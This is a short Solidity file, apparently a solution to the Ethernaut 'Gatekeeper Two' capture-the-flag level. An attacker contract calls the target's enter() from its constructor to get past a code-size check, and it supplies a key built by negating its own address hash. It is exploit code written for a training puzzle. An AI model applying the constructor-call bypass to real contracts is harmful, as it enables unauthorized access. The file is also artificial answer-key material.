// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IGatekeeperTwo {
    function entrant() external returns (address);
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwo {
    IGatekeeperTwo gatekeeperTwoInstance;

    constructor(address _instanceAddress) {
        gatekeeperTwoInstance = IGatekeeperTwo(_instanceAddress);
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        bool success = gatekeeperTwoInstance.enter(key);
        require(success, "Failed to enter");
    }
}

contract GatekeeperTwoDeployer {
    address gatekeeperTwoInstanceAddress;

    constructor(address _instanceAddress) {
        gatekeeperTwoInstanceAddress = _instanceAddress;
    }

    function deploy() external {
        new GatekeeperTwo(gatekeeperTwoInstanceAddress);
    }
}
